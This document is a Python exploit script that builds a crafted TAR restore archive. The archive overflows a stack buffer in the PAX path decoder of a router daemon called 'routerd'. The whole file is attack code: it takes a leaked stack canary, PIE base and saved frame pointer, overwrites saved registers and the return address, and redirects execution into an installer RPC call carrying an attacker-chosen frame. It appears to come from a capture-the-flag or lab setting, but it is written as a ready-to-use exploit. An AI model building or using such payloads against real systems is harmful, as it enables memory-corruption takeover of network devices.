#!/usr/bin/env python3
"""Build a restore TAR that ROPs routerd's PAX decoder into installerd RPC.

The negative diagnostic-window leak gives the current routerd handler canary,
PIE base, and saved x29.  The saved x29 is the handler frame pointer; its large
local-stack base is ``saved_x29 - 0x46c0`` and is reused by the next request.

The PAX percent decoder at PIE+0x804c writes up to 0x3ff decoded bytes to a
0x100-byte stack object.  Its saved x19 and x30 are replaced with a pointer to
an embedded length-prefixed installer frame and PIE+0x8f78 respectively.  The
latter is the existing ``mov x0,x19; bl 0x7ea8`` call site.
"""

from __future__ import annotations

import argparse
import struct
from pathlib import Path


DECODED_LEN = 0x3FF
DECODER_TO_OUTER_SP = 0x168
# The leak exposes the handler's *caller* x29.  main's x29 is main_sp+0x20,
# while the handler's large local SP is main_sp-0x46a0, hence 0x46c0.
CALLER_X29_TO_OUTER_SP = 0x46C0
FRAME_AT_OUTER_SP = 0x100
RPC_CALL_SITE = 0x8F78


def p16(value: int) -> bytes:
    return struct.pack("<H", value)


def p32(value: int) -> bytes:
    return struct.pack("<I", value)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def installer_status_frame(leak_length: int = 0x1000) -> bytes:
    if not (1 <= leak_length <= 0x8000):
        raise ValueError("status leak length must be in 1..0x8000")
    reserved = (-leak_length) & 0xFFFF
    wire = bytearray(0x90)
    wire[0:4] = b"ISF6"
    wire[4:6] = p16(2)
    wire[6:8] = p16(0x73)
    wire[8:10] = p16(reserved)
    wire[10:12] = p16(0)
    wire[12:16] = p32(0x90)
    return p32(len(wire)) + wire


def build_decoded(
    *, canary: int, pie_base: int, saved_x29: int, frame: bytes, client_fd: int
) -> tuple[bytes, int, int]:
    if not (0x90 <= len(frame) - 4 <= 0x600):
        raise ValueError("frame must be a 4-byte length prefix plus 0x90..0x600 bytes")
    declared = struct.unpack_from("<I", frame)[0]
    if declared != len(frame) - 4:
        raise ValueError("installer frame length prefix mismatch")

    outer_sp = saved_x29 - CALLER_X29_TO_OUTER_SP
    decoder_buf = outer_sp - DECODER_TO_OUTER_SP
    frame_ptr = outer_sp + FRAME_AT_OUTER_SP
    frame_off = DECODER_TO_OUTER_SP + FRAME_AT_OUTER_SP
    if frame_off + len(frame) > DECODED_LEN:
        raise ValueError(
            f"frame does not fit PAX overflow: end=0x{frame_off + len(frame):x}"
        )

    blob = bytearray(b"R" * DECODED_LEN)
    # Offsets are relative to the vulnerable decoder's output at callee sp+8.
    blob[0x100:0x108] = p64(canary)
    blob[0x108:0x110] = p64(saved_x29)
    blob[0x110:0x118] = p64(pie_base + RPC_CALL_SITE)
    blob[0x118:0x120] = p64(frame_ptr)  # restored x19
    blob[0x120:0x128] = p64(client_fd)  # restored x20: accepted HTTP fd
    blob[0x128:0x130] = p64(0)          # restored x21
    blob[0x130:0x138] = p64(0)          # restored x22
    blob[0x138:0x140] = p64(0)          # restored x23
    blob[0x140:0x148] = p64(0)          # restored x24: success count
    blob[0x148:0x150] = p64(0)
    blob[0x150:0x158] = p64(0)
    blob[0x158:0x160] = p64(0)
    # blob+0x168 is the restored outer handler SP.  Keep a small neutral area,
    # then embed the length-prefixed installer frame at outer_sp+0x100.
    blob[frame_off : frame_off + len(frame)] = frame
    return bytes(blob), outer_sp, frame_ptr


def pax_record(key: bytes, value: bytes) -> bytes:
    if b" " in key or b"=" in key or b"\n" in key:
        raise ValueError("invalid PAX key")
    length = len(key) + len(value) + 4
    while True:
        record = str(length).encode() + b" " + key + b"=" + value + b"\n"
        if len(record) == length:
            return record
        length = len(record)


def octal_field(value: int, width: int) -> bytes:
    text = f"{value:0{width - 1}o}".encode()
    if len(text) > width - 1:
        raise ValueError("tar numeric field overflow")
    return text + b"\0"


def tar_header(name: str, size: int, typeflag: bytes = b"0") -> bytes:
    encoded = name.encode("ascii")
    if len(encoded) > 100 or len(typeflag) != 1:
        raise ValueError("invalid ustar header")
    header = bytearray(512)
    header[0 : len(encoded)] = encoded
    header[100:108] = octal_field(0o600, 8)
    header[108:116] = octal_field(0, 8)
    header[116:124] = octal_field(0, 8)
    header[124:136] = octal_field(size, 12)
    header[136:148] = octal_field(0, 12)
    header[148:156] = b"        "
    header[156:157] = typeflag
    header[257:263] = b"ustar\0"
    header[263:265] = b"00"
    header[265:271] = b"router"
    header[297:303] = b"router"
    checksum = sum(header)
    header[148:156] = f"{checksum:06o}\0 ".encode()
    return bytes(header)


def tar_member(name: str, data: bytes, typeflag: bytes = b"0") -> bytes:
    padding = (-len(data)) & 0x1FF
    return tar_header(name, len(data), typeflag) + data + b"\0" * padding


def build_tar(decoded: bytes) -> bytes:
    # Encoding every byte avoids PAX delimiters and permits embedded NULs.
    encoded = b"".join(f"%{byte:02X}".encode() for byte in decoded)
    pax = pax_record(b"path", encoded)
    manifest = b'{"format":2}'
    archive = bytearray()
    archive += tar_member("manifest.json", manifest)
    archive += tar_member("paxhdr", pax, b"x")
    # A following regular member makes the archive structurally valid for
    # standard TAR readers.  routerd is hijacked inside the PAX decoder first.
    archive += tar_member("dummy", b"x")
    archive += b"\0" * 1024
    return bytes(archive)


def parse_int(text: str) -> int:
    return int(text, 0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("output", type=Path)
    parser.add_argument("--canary", type=parse_int, required=True)
    parser.add_argument("--pie-base", type=parse_int, required=True)
    parser.add_argument(
        "--saved-x29",
        type=parse_int,
        required=True,
        help="routerd handler saved x29 from logs body offset 0x45d8",
    )
    parser.add_argument(
        "--client-fd",
        type=parse_int,
        default=4,
        help="routerd accepted socket fd (normally 4; prior leak body+0x45f0)",
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--frame", type=Path, help="length-prefixed installer frame")
    group.add_argument(
        "--status-leak", type=parse_int, default=0x1000, help="build opcode 0x73"
    )
    args = parser.parse_args()

    if args.frame:
        frame = args.frame.read_bytes()
        # Existing build_installer_frames.py artifacts are raw ISF6 wire
        # frames, while routerd's helper expects a u32 prefix in front.
        if frame.startswith(b"ISF6"):
            frame = p32(len(frame)) + frame
    else:
        frame = installer_status_frame(args.status_leak)
    decoded, outer_sp, frame_ptr = build_decoded(
        canary=args.canary,
        pie_base=args.pie_base,
        saved_x29=args.saved_x29,
        frame=frame,
        client_fd=args.client_fd,
    )
    archive = build_tar(decoded)
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_bytes(archive)
    print(f"output={args.output}")
    print(f"tar_size=0x{len(archive):x} decoded=0x{len(decoded):x}")
    print(f"outer_sp=0x{outer_sp:016x} frame_ptr=0x{frame_ptr:016x}")
    print(f"rpc_call=0x{args.pie_base + RPC_CALL_SITE:016x} frame_len=0x{len(frame):x}")


if __name__ == "__main__":
    main()
